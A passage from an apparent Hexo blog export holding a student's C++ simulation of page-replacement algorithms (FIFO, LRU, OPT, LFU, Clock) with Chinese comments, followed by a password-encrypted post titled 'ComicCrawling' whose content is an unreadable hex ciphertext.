class="built_in">ord</span>(_ord)&#123;</span><br><span class="line">        lAT = <span class="built_in">clock</span>();</span><br><span class="line">        fAT = lAT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vMemManager</span>&#123;  <span class="comment">// 虚拟内存管理——换页模拟</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">const</span> <span class="type">int</span> metaPages = <span class="number">10</span>;   <span class="comment">// 每页10条指令</span></span><br><span class="line">        <span class="type">const</span> <span class="type">int</span> vPages = <span class="number">32</span>;      <span class="comment">// 虚拟页数32</span></span><br><span class="line">        <span class="type">int</span> pPages;             <span class="comment">// 物理内存页数</span></span><br><span class="line">        <span class="type">int</span> acs;        <span class="comment">// 访问次数</span></span><br><span class="line">        <span class="type">int</span> mis;        <span class="comment">// 未命中次数</span></span><br><span class="line">        <span class="type">int</span> curOrd;     <span class="comment">// 出局位序指针</span></span><br><span class="line">        <span class="type">int</span> opId;       <span class="comment">// 指令指针</span></span><br><span class="line">        vector&lt;pMem&gt; pM;</span><br><span class="line">        function&lt;<span class="type">bool</span>(pMem&amp; a, pMem&amp; b)&gt; cmp;   <span class="comment">// 动态赋予的静态函数成员-&gt;函数对象地址</span></span><br><span class="line">        <span class="comment">// priority_queue&lt;pMem*, vector&lt;pMem*&gt;, decltype(cmp)&gt; pvPages;  // 放入物理内存中的虚拟页</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="type">static</span> vector&lt;<span class="type">int</span>&gt; opSet;   <span class="comment">// 静态指令集</span></span><br><span class="line">        <span class="built_in">vMemManager</span>(<span class="type">int</span> ps,</span><br><span class="line">            function&lt;<span class="built_in">bool</span>(pMem&amp;, pMem&amp;)&gt; _cmp</span><br><span class="line">        ):<span class="built_in">pPages</span>(ps), <span class="built_in">cmp</span>(_cmp), <span class="built_in">acs</span>(<span class="number">0</span>), <span class="built_in">mis</span>(<span class="number">0</span>), <span class="built_in">opId</span>(<span class="number">0</span>), <span class="built_in">curOrd</span>(<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// pM.resize(0);    // resize会调用模板类的空构造函数，若不存在会报错</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getPage</span><span class="params">(<span class="type">int</span> op)</span></span>&#123;    <span class="comment">// 指令的在虚存中的页码</span></span><br><span class="line">            <span class="keyword">return</span> op/metaPages;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getDis</span><span class="params">(<span class="type">int</span> idx)</span></span>&#123;    <span class="comment">// 距离下次访问</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=opId; i&lt;ALL; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">getPage</span>(opSet[i]) == idx)&#123;</span><br><span class="line">                    <span class="keyword">return</span> i-opId;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ALL*<span class="number">2</span>-opId;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">newOrd</span><span class="params">(<span class="type">int</span> n=<span class="number">-1</span>)</span></span>&#123;       <span class="comment">// 新添出局位序————标记相当于后移一轮，由于本身就要后移一轮，因此变成两轮</span></span><br><span class="line">            <span class="keyword">if</span>(n==<span class="number">-1</span>) <span class="keyword">return</span> curOrd++;  <span class="comment">// 非置换</span></span><br><span class="line">            curOrd = n+<span class="number">1</span>;   <span class="comment">// 置换</span></span><br><span class="line">            <span class="keyword">return</span> n+<span class="number">2</span>*pPages;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">updateOrd</span><span class="params">(vector&lt;pMem&gt;::iterator _pm)</span></span>&#123;    <span class="comment">//  命中————两轮内的（不包括两轮）可以后移一轮</span></span><br><span class="line">            <span class="keyword">if</span>((_pm-&gt;ord - curOrd) &lt; pPages)&#123;</span><br><span class="line">                _pm-&gt;ord += pPages;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">updateDis</span><span class="params">()</span></span>&#123;   <span class="comment">// 更新距离</span></span><br><span class="line">            <span class="keyword">for</span>(pMem&amp; v : pM)&#123;   <span class="comment">// 迭代更新物理内存中的虚拟页统计</span></span><br><span class="line">                v.dis = <span class="built_in">getDis</span>(v.vIndex);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">nextOp</span><span class="params">()</span></span>&#123;     <span class="comment">// 访问下一指令</span></span><br><span class="line">            acs++;      <span class="comment">// 访问次数增加</span></span><br><span class="line">            <span class="type">int</span> vId = opSet[opId++];</span><br><span class="line">            <span class="type">int</span> tmpP = <span class="built_in">getPage</span>(vId);    <span class="comment">// 获取虚拟页</span></span><br><span class="line">            vector&lt;pMem&gt;::iterator pIt = <span class="built_in">find_if</span>(</span><br><span class="line">                pM.<span class="built_in">begin</span>(), pM.<span class="built_in">end</span>(),</span><br><span class="line">                [tmpP](pMem&amp; _pm)&#123;  <span class="comment">// 虚拟页码对应</span></span><br><span class="line">                    <span class="keyword">return</span> _pm.vIndex == tmpP;</span><br><span class="line">                &#125;</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span>(pIt == pM.<span class="built_in">end</span>())&#123;    <span class="comment">// 不在内存中</span></span><br><span class="line">                mis++;</span><br><span class="line">                <span class="keyword">if</span>(pM.<span class="built_in">size</span>() &lt; pPages)&#123;</span><br><span class="line">                    pM.<span class="built_in">push_back</span>(<span class="built_in">pMem</span>(tmpP, <span class="built_in">getDis</span>(tmpP), <span class="built_in">newOrd</span>()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 置换</span></span><br><span class="line">                    pMem &amp;pm = pM.<span class="built_in">front</span>();</span><br><span class="line">                    pm = <span class="built_in">pMem</span>(tmpP, <span class="built_in">getDis</span>(tmpP), <span class="built_in">newOrd</span>(pm.ord));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 命中</span></span><br><span class="line">                pIt-&gt;aT++;</span><br><span class="line">                <span class="comment">// pIt-&gt;dis=getDis(pIt-&gt;vIndex);</span></span><br><span class="line">                pIt-&gt;lAT=<span class="built_in">clock</span>();</span><br><span class="line">                <span class="built_in">updateOrd</span>(pIt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">updateDis</span>();</span><br><span class="line">            <span class="built_in">sort</span>(pM.<span class="built_in">begin</span>(), pM.<span class="built_in">end</span>(), cmp);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">double</span> <span class="title">tick</span><span class="params">()</span></span>&#123;    <span class="comment">// 模拟换页触发, 返回命中率</span></span><br><span class="line">            <span class="keyword">while</span>(acs&lt;ALL)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;<span class="built_in">nextOp</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>-<span class="built_in">double</span>(mis)/acs;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">randNum</span><span class="params">(<span class="type">int</span> n1, <span class="type">int</span> n2 = <span class="number">-1</span>)</span></span>&#123;    <span class="comment">// [n1, n2) [0, 0) =&gt; [0, 320) [319, 320) =&gt; [0, 320)</span></span><br><span class="line">    <span class="keyword">if</span>(n2 == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n1 == <span class="number">0</span>) n1 = ALL;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">rand</span>()%n1;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(n1 == <span class="number">319</span>) n1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">rand</span>()%(n2-n1)+n1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">nextMid</span><span class="params">(<span class="type">int</span> m)</span></span>&#123;     <span class="comment">// 迭代指令 [0, 319]</span></span><br><span class="line">    <span class="keyword">return</span> (m+<span class="number">1</span>)%ALL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt;&amp; <span class="title">randOperation</span><span class="params">()</span></span>&#123;   <span class="comment">// 生成随机指令序列</span></span><br><span class="line">    <span class="type">static</span> vector&lt;<span class="type">int</span>&gt; p;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>));     <span class="comment">// 初始化</span></span><br><span class="line">    p.<span class="built_in">resize</span>(<span class="number">320</span>);</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>, mid = <span class="number">0</span>;     <span class="comment">// 随机取一条指令</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">80</span>; i++)&#123;</span><br><span class="line">        mid = <span class="built_in">randNum</span>(mid, ALL);</span><br><span class="line">        p[cnt++] = mid;         <span class="comment">// 随机后地址</span></span><br><span class="line">        mid = <span class="built_in">nextMid</span>(mid);     </span><br><span class="line">        p[cnt++] = mid;         <span class="comment">// 顺序</span></span><br><span class="line">        mid = <span class="built_in">randNum</span>(mid);</span><br><span class="line">        p[cnt++] = mid;         <span class="comment">// 随机前地址</span></span><br><span class="line">        mid = <span class="built_in">nextMid</span>(mid);</span><br><span class="line">        p[cnt++] = mid;         <span class="comment">// 顺序</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; vMemManager::opSet = <span class="built_in">randOperation</span>();   <span class="comment">// 初始化指令集</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> fifo = [](pMem&amp; a, pMem&amp; b)&#123;     <span class="comment">// 先进先出</span></span><br><span class="line">    <span class="keyword">return</span> a.fAT&lt;b.fAT; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> lru = [](pMem&amp; a, pMem&amp; b)&#123;</span><br><span class="line">    <span class="keyword">return</span> a.lAT==b.lAT?a.fAT&lt;b.fAT:a.lAT&lt;b.lAT;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> opt = [](pMem&amp; a, pMem&amp; b)&#123;</span><br><span class="line">    <span class="keyword">return</span> a.dis==b.dis?a.fAT&lt;b.fAT:a.dis&gt;b.dis;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> lfu = [](pMem&amp; a, pMem&amp; b)&#123;</span><br><span class="line">    <span class="keyword">return</span> a.aT==b.aT?a.fAT&lt;b.fAT:a.aT&lt;b.aT;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> clock_vp = [](pMem&amp; a, pMem&amp; b)&#123;</span><br><span class="line">    <span class="keyword">return</span> a.ord==b.ord?a.fAT&lt;b.fAT:a.ord&lt;b.ord;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\tFIFO\tLRU\tOPT\tLFU\tClock&quot;</span>);   <span class="comment">// field</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">4</span>; i&lt;<span class="number">33</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n%d\t&quot;</span>, i);</span><br><span class="line">        vector&lt;vMemManager&gt; vmSet;</span><br><span class="line">        vmSet.<span class="built_in">push_back</span>(<span class="built_in">vMemManager</span>(i, fifo));</span><br><span class="line">        vmSet.<span class="built_in">push_back</span>(<span class="built_in">vMemManager</span>(i, lru));</span><br><span class="line">        vmSet.<span class="built_in">push_back</span>(<span class="built_in">vMemManager</span>(i, opt));</span><br><span class="line">        vmSet.<span class="built_in">push_back</span>(<span class="built_in">vMemManager</span>(i, lfu));</span><br><span class="line">        vmSet.<span class="built_in">push_back</span>(<span class="built_in">vMemManager</span>(i, clock_vp));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">5</span>; j++)&#123;</span><br><span class="line">            <span class="type">double</span> hit = vmSet[j].<span class="built_in">tick</span>();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%.1f\%\t&quot;</span>, hit*<span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>Development</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Schoolwork</tag>
      </tags>
  </entry>
  <entry>
    <title>ComicCrawling</title>
    <url>/2023/02/21/Development/Project/ComicCrawling/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="4bbaf2424fefe1638a25a109b71da051b115717467f47290e14ffa315faa6cd3">93f063693304a79e562da81abee9f02224eceb638a020ca96ef0c94833a50ef477016a872342dd60d1a29f6299533da5aef0477bff498b0bfb09b248c2884fbcb757997ad6ee14cb58ee7bad048dd411977a37eb883240ace1b5c2476d5bf578df3ad0fe0c5102693ece064b18ba2a8e1781a9787633f5f811d04033bd8cdefab73c23d6b97a297c45017ed7467a87ef852d82f875a8c4a9e54a5127cfa1d0a97c4443710065428f2ba9ed4947d4607760200b825fd731f3af374a73322ebc975281cd6136136eeea36ae3f3e8290d705d612cbf1006c94d0dcd4734804f9e409e03d0b51b3b9e7da03f5f1272b482209d5b27afd3b1e41d32db613b10235ba987c4d58d50a77fc46db64a7e87a7bca2eeaaa9e0be29782314a55abf9f7e0a497f2f028bbc89354a730e63ce8e6ee9a8f0ab51cbad7d64e6b6d68b78d414708a2811ba13fb529ab9a1ba5fb78caa78d922ac8a1e0b1648367aa0b18d2281a20faac236f663e017f8c2f766838234ce70a3357a8484245ef63487cf4781c8774491a012d0268aa6da2b63bf5e268bf6c22c44ce1ea50ee0b2f9ff8c613578baad5f899e81a1a9ecec69747eed0efb4364ba91ecbbbbb4f7b02f70be696f5093a5ff45e984e26ac535447be01d928dcc64d19bc616fc216c2cce898df49f57ca806a1bc8647bb507d7348bfb2d84f5711083109ab7b434be4324cb61b50e811928c73bef193fdf6c015f8b678d749ba7749fc2821b8c2ec640ba1b699d8a8981ea8818369186924b3907d8e6096f6a274c1f9f4d78f38102946177753520fd9472182e12ba46eee1ca9d0c3dda3457fc8f553f095c2d9c4c425ff957254bdcc1bae9ebedb62756090987a41036316a4514d63bb4f8195be9335775f2e787c886d674b07f91a3358edad3373d6322b8bebe1c184cb8bfb940833a332a0cfa2c299ddc0adbecd62c842b1272ba73d062ffb012edaed4dd38b245a50f16708e38bae31712abe0efe295d05a49f77f85abb0fd20743636d6e8ad73b0aa2ee422dc36ce2bd483691570f79fa776cf4e23f7168b2c65d412a0b59792994319facc3fd03e847178ef3700ef7cc0e0245fc8ea6260b032094037df01cc618ea24aa7d98cfaae3982e62b2ee56364f5f8bf90393c676145b05eab91f9d4ab78a149abfbf859b42cde06a27db871c4cb9a5c1bf036cf58b9e07493810172f6886b12612bdc63f9baaaa2049103cc5abc4daba102f5edefb5c3cbe9c01ae9be270b677fbea4351aaea31b7b827ac1df33432d2ab419dd635dc0dcef06446a9797223a59fd74dff53266ce4bbf9edb258f1be20749fc64a61b3be971016979ab1ca12ca5b3494b866408bac2c7fd8839e86e342befb0ce8417687d4412d32862d0e77fdabb0ed99a30da6cb2e1817b559342221ab3a9aa3a75126c2f87e1c4b0ced52ddb459e8190225f97c30e807a57ab45bf381fa7e446d82b4156e6677e3f67a803876843daa9cbebdb92efe3980eb0cf92505bdf3713eb38b208fdffa540b7661a0eabf16571bbe78c4e9fca029c3f69deb57b48f54dd4441acb48b0097f450f07e54c1d78614cda681dfa6eccd6526eb738ef2df13d001e46299d62aa4a014eb4a808ca423df0440c75fbfc24ef150fa916329ec907f2f0d6d1e8c3f04ebec6b491979c810fbb051ce334f7af5b8733cf5ee44aa09648267de9ac7b1ca80729234a9efc3b7941a01f7d264e97b8aeefc10d8893b2b84157188bc1bcee105ecfdc11ead8dc387d8c80a7cf4e99997c3fecdd4c06db20e22fc85ef3cd2b8125729f6339d8286e4ffb5c2a3a0335edbe6932bbbfdaeeb170ad45ca7aed16462e4fa9d2f6d760345bd07e792f82b2174434a4da3d43d26d70aa41d94d0e00250e0f8b517a523f62485ae742b77c3a7ae817869edd10da8f37dc29b7588e324135ebfa383102d42f2c709a5543520449b1e06e0f9172814e3d7c58b5df8dd3160bf03b622acc92398fc988ba5f5c21b2b534b1aeeb078b26eba3707f479ad3dac87c32e770d64389b6adebdcdbefd05eb37e37b5df2e599d17e9ce1cc80546096f5468a2cb085aafdbec3762aa98a396ad87351b9b0ef0ea1d95266c860ddca13288b9184a229063aba067435ff91ffd9eee4242a69670e1d2e5cec4674981f4a63f5e3f2d57068fd81f22166edd9e47fdb7491766459b787ffe440f70d69de3643bbff2fe87969bba8594b3963d081e461e030bf0857b7c0e2c346a319ef86308a455dfabe7d3a0a95150e3cdf54baf960d53d600440ae8e75cdc9b1a98183d7e36f9b46e9cba5172357c94d3c17d59a9f1924468be5375192cc21913dc9b94bc19abcb9dca4d856264c3adbb89f226d97cf97a520fa206f00ee62faff4efa63691f5e16a325ae18cf7a4118a7fa038f4c0ecdcf2da01a1e17577f8ea512c974717e97920b691f5b4846929fed07ae9455083be391f772b63217cc3a1ac90b2478074b80cd0e8ebf3ae81a3e603163910669cee45227a73905253bce9897559018b3fa3c6e21441079b8ca4c3aa8710111683f64360e397e69b71a94059d032b5c810c81c9615d0b7b54fd6164000f1db6f04cf4a3d009bc3b705c23e598e454a94fa7880d0af676773cb8f8810c72b351cc35210af8ca01504137ca167540c4dee79692b531938a43e566f40cb1b3a824daf8641c31adb2646a3408a174857cc9240f598b6cc3d9210e7700b65a9200dabda0fd34fad1901f4a99b17da63717720d0d6a861a1a84f7ae85b0475ee83addec1a4f19753f6babca80228650edda1fecab32dc1a704f86eab8ac25a50a077bd071ecaf8dc799f876196c13bf91d34344b5d7a93a1fd252106261329067f0130a432da5e6fe18782202a11ee98cfce132fb2b417b1b0cf1404e98e9dfad13743e5463c735c9bacb8a872a3b46fdec61ba27906995cbebb3a3d58a5c62717e33e7d1a1c1cfd12376b07a1ace2b1ff004fca3d75495b06a521c2b3255e2f9b2e476f284f4f6d44042c81ce00c1d122c3249a1c5d0bc7f7bd753f71d0573479c9d6f28ccb062a7ddc989cfb513943f83f7dc065cf4f23f5e8fcc1dd66cb8dcce810a997ac8f297377384d44ad2cb5277160728b607552c9a3530a2af817161ec546efd94c4fa0af134f3f3a83a05082a9fd57847579236fd278f910ea53d3b614b517d4b80fe3d8dab12e205ca806a6ac5f0975985e99c1ebe885a2e9bd7da03f111cb0742d7023a52d5ac9e33b0cf4b4654541eb4a9d7310ed2e3044b442521a1951a4d4498bd1b4f8f731d871207bae6295924e9c08b1a219ae1d0a2063f36a6f19e505636b047e946299f93d8add3c36644f12375ec1fa9bde442336dab1b75d4de846f15e2d4e13c329239421a6ba9df227bcb6cd0ff6522a9afa9818876d7b8b5650321806cc7685a84ada2f0ec9da93e64b59beb6672f60d9b4cbdffcb04129d2765246117b3ac93391933da90b79e4174668f36b52b5e4833b72d573ecdd582734d68e400005391b45731e42e68743944cd2be6b83b7783aad318a1bf0a812169ecd9908ba6083e472e351e78933ebda3b01a12db9b0354358eb0af0c36b0c038c6988ac4b4b9bd0c862d7bd11b8f7ffbdae6891e8a441b484bb33ab58b037214a663009715861e4bb3c982d5dbea237e4a4fc40b06c97e223c6e550ccba3b9adb342bf7848245429977e7db1bfbc12d8b3059de6ac3e5dbf73cc231ff06d944465b11caeab9b784e95a78db3c05181f9d973909d87aad6019c34ed9ea63f853ee69153344b82424da9e29d4b11ba2b0be7768cbb35a96fe3e96a2bc98e9d271ec708c241781c27d4b59440b11bdfb7275b5fe4a3b96ac737f588c60d87cfd90555191c9608c1beae7b448e989b68307efd336840a5b7b4fe929cf1828721909ea78993782fd6f557e2eedff520cd07a0421df16d8ff98c8a643f4c5adc07bc2c1f1d8931562c8626b3496e2491f1d3d028905a2b8f495ecb1d7b15b2bb942cd1b48757d3a0e36d7962ee2d279b0266da3edbad66dfbd528f3abccc29f0d4251c45ccb7c454e8f22ab7a49fec2d1d5df441ddba1c2885bae5684f35c6920cb77af52264bd70822343fba35d2cb4418fe83fbe20046fbfda2ab9bc591e40269316bd216b88f5f1f57b73ef88ef8991a564bf94631fbfa4a7d4e1c158081e4363043ef231442e9726892785f970abb05ec8400f3c7a1fd9a807b27eb517d01f6e1b0d5b89070b9e3798c43659e26380da5286b769801367e6a6b1440813913c11cdb54c2733d198e0e83ec01cb517ecb0ce2591fdf96a46417acafd828d6f24541013962a220167533ac518af16f29be23b80306a533cc1431e6851a1d33ee30e410a9489cf46fec1f44eac2d78cffc5136d7a4d2b82c73a36c388774bfc61c795b822f690e8e2e58b55d3133a4dd1dd182ae2de8fa453376ec7bd46c8dbaf65fd6bf4fac22c9472be8837d1f8b589f1dd318b5338230bf63477ca1cdb64e7090d93e782811e62decf66347f112b060e6397cfab7dc93b29553d71f9917bbbf107c05b951e82dfad5c7dca727fde32674a52c8adaa936c476835927d0ee2d4fa06c6e14f591f6a7555dd41b8e41654a8df62b7efee844b3463ca90cad9ead77a8a588d286a736cc22d6fdfdcbe7ac12bb0f74d4ee841e9cbbe0606659038342c29b9e3d3ac5665676b51a7ea70819675d2abc951b3c7d3a12b79f8b02b93e00bb802e1b58c045588b7e47c38419da494c1a5d0ee8db231a31d644f83e40521d73d4475beef81837cfed0032ae093b5459fa6aa02da265cc72b88ac2fda63c78c2184d2e76639a94decaca8de6d64938a99f0623b8e9a918b7bfa56b75f3c93b953548f6e1784839117d79f3c40127869565ffc3f28cbf242cadb83e9434a9479e0c627efee59bf3274a1e1d4b4a274f68fb3555bce58bb2481187147a0f43d12669722efda509c4c03c6186dea5d0de4e70a1c23b43dfb8f5f96a6132d4b4b7788ff27ad762b2fd35d4925d74fe4dbe7394b9fa613c3df019d2ad672076fe55ec8653489b1575cdba1216004644dff41dbf6a8d789f2e8c704e3bf2c3591be5c3f8c87a457b168d6796f5114d4f0b94dc84cce71dc6db5e91e4de0251f00208d2a383620f149e38a2a2c792ea2ee49b96f54829f6c5c20a69c296e1f90e1124c285e74102916aff2945e7615bf1182ce32529002586bae6f7161dd806f14c21e615edfd39788ae4f5c60e22248c9c408be46602311f2cae2335bb62d896bb1e63e94efe6003b2bfdebe57fad063da73dd2c951e9083a4f3c79af675b95f4561092caad8fc20597c761688dd8ebc9f5e37e82ef05471cce97ab031bf608147731a203860d9cec33b43ec6a63ce58b9053ca7ce56139699245745056b515058a91a75363e15418a32f8d0d832116ee00a787b8738dd518ccc3ead6c8e8705e20d47e09c8a7bbc4e39813def9d18c2f59c1c71a8d089aba8e31d1ca37351fc73fdcac690449fa8cbc28424580e57d9c67ae759d661ee99a6e15645fe06e13c741fb7105639fb6f9ebc8b62195d3afa4c1a85c0d7a32cb93e10fd4137136f071b33b3867115c2bb69ef1d7c202425849d12432bd51c92a82f3c4b86ca7aaf98cc1792456d8affb0df4b44d07739932c01cf6419230f6e1f891117145960a83b3fe9eb29b0e106ae6822071e9780eca5f831c0b760d3df1be196c7a291038bcca3a1896484dc1a31904722eccf951370ff9358eca910ee329fd1e95368315dc737ddc3560456c7b7a46b773c8dff6d037c6f5cff99781ddc6b2a9dbfb24c718b094c8812c9ce26b6856a7b4de733e43efe955c3ff0dcccf821c7de94164d7aef8e99bae3c2e49a1bbc4f82b611c35da1a7098caabccdd91995c0e7b9794ecd81d8f8c2aaec8b4fce52fad15f874cf98b58d377732541d977605b2f91b93b4ffc9a673fecd18f0dce33f0e0c83642b97c9404131579163dbb0a2dd58d1ec420d229db3b0400be3880f8bff9463c4d60fc5d702e13e8f7097fcf56f7ad6f7e927e6ae01ef815fe55e8e3d405dac98e13860b6d4f690da7ec16c2962e013ec6ff4d4b3cb7525f8247700162785ec1376b01d94622367917fbe55185f2cffc331a41d1d97026a9709dbd03d9bcd7ff7a8bfeec8df0b1d4770934afbe4fbafba905a4e20b998b8b7b0df294c1da25315aa3b0ecb408d10bc0f886d0f6d9c63c3aa472fede02ac68a39b89dfc6bdeec46855e7635fc159bb0b12d810c91626f3b9cbfc3e7b6be40020ae8004cdab5d15f76c80163d544b794c54917e7944c4af97261073b82194d8e2ce1b7fedaa980dca122ef02be39b0dde8fb2bf7821ac3f446c154801d23900e5b1463a805db1962cddc220abcaa43362dc97ce239acb0112178d0f81d74c4324a1ae109fd53fecdda47df9330f94886692e17ec0863f978d2b3de573acbe03579e33e3114692912c1d69e4b3a34b7fdab061a5d8177ecaad255f41d0a0d49a013ead3b4ec0d91ac79c55982dcc93a6b99ad84431a3b6c0f60d3f5162b4ade3674ca96531fc758b77b045d99049a321439b0dda1fec660d17c0baa4531a354639c0c13b4b5d99301e9172800add2699308640c36688b94d3fa437604334870cd2d22c786fc2bb72504aa4c0ec2d5dfa3965a9a7e2469aca6f4c0b2abbf89592430508e2755595ac59320cd12ff8376d452874616ecfd7541264f6f427ab750d438fe8f78fd2bab532291bf2d16127e67f826b2fb490ac7c4ee5fbe3216e3201750403a0fc3231f871eb64b8991fea89614fd36c6448b0d69d770fde67371ea538a1c3d9de7032f194e54030c973b3bca9a27b8e5ddeacd531251f66e9ca67765d640ebb3fa96266bd337ab4efc76b263c8bf77cca873305d0430510369f3d8bf591b706452544d4139bb7952dced72e1e2122e3c3af8045bccd69e79601d5efe38a26ad7ad7e5b7add65b756ac2ac1d4093b7a845217a737f4de5fecb33cebdc4ebb44fa96ccfe287090875be5a7cf62e23e813319c8ae321e1435380698e6dd263deca0dd7228d86f4923dea9ad9aff07794b01078ffc5447e349a9fcf03b2dc5f2165a3e29ae6bf6ac21a45c069d6773312a84ef25ea76f8f352f8b9358987678b2f024c57c69878a37bd32ab4dfb5843ac6c68d034517f7f5bf0c9c82dea38a9888ab5d48af647bf8c38826c651ed3446697aeda6f675e39959a5a0456153cb65e3f435918f59ab19230d12fea2c6ecc731b2399d909db01e5f0d157b1fd7c60440a07734dc9400fb67f130bd5f862dab2fe0d340fa507b2c480a0e449bcc11514b09a49141d27cbaa5ac7e12be938730951cc1229ca0b07f921013fcae7c6dc04563190e21679230d8e5102d3c4b540be0ce3e157de3decb7374fa7e1b9bfcd0960f11d805d7818ec5c89a44933321142d6cb1e4fc631f81ddf8c8c7e32e448a780111a511a05477e0d1f22dc40b6eeb9789ddedc3aab96e5fa117b98f37bf1ea7702eb867569665a98da52e56c853c39d8d24bc07b6fa2c84a9f4ae221367e8fad363f1f76d0d073fde29f09583e70c49d2ec6d3b87fda5cc49b57d6dc757765bab71a81c6265a083d869b6e2e87e2a1bc3d9c4b1e60c319b0affa55fece75b2c7230a6ed5f4626f4b8cc13d4b94fffdc047026bbb54b6c5ed50c305fbdfb1a36e29b88f445fb96543085aa1520c00be8ffb0aa54bbb12cdac86c31b80f26efac078f46f1a3bd028d9e3375a98595f754198a7b567f206cb78cb7a6935ffaf9dbf9ceb09fdf8fc50ff48395f6c648ca79ceabc44a6d8e2676265be63858711161d0e3828f1544239e9595c72c9e48d42126664e8237a8b32af280ba21517090410a737f8049c17ea85617c17245019f0d181c0bfd174d2da38f1f1f9bef3ba63122dda8e08ef819321b1eae1ce850a5c78811fe53747d1501b8bec6d14f71251da4c25c77ddafb256b69ea5fc1e3c1ed564825638b75e6d40304e3d71176351f1bfed58b874618d8f2df71dc3aa2e97618d065d34b86452724164a729130411effc1970b80daff01c2c78afb10715bce087ad6b33281a145a670fefef260e1e0d2c8542b2ef475cc3ead541d1bc9a70a89fd35ff7020d54de5d0f8833ac5ae6a592d975e042726c7687dc0abf9e6c9c72073937dab37b1381876f5162ec26153b805b2f53a3a8a0e9fbc11d7fc765197b9d3efe5ba351071609a27835ae5e744478c5414f3b17873e08c0e8da5654c38349bc7f8c984eb8cccb3887e0de48152db315a13bd5656775d5556457dbcd37b096a001f4d80c6e421eb6bde41b34ffdfcb1a2e41792023037f54328558f6c328fed347b82a206fab11b8ea8c06534f6875f5c5bfa4ffbce5df722093cf71163b503a3216d9f8a5c53f400e7ae5609500f64952fda7e6e79c023bbbe125f1a87bc3355d21f0ae201f5b071d20207f85f4e45772893a2841ca3d5532bdc6b72c85a51e9cb1d23ac8662aa7cd0b171931848ff1484833531d6e6ebf8e464ceab1c25547d95d7b9075f81b37ae84cb22d20a718a628d0db1a33addd17b4f3555d149d9ea0f0de5a195a7a2cb9f0ad75886a9ac374fae070c6c3c10e374f167017d911dd9b637ea1bdc304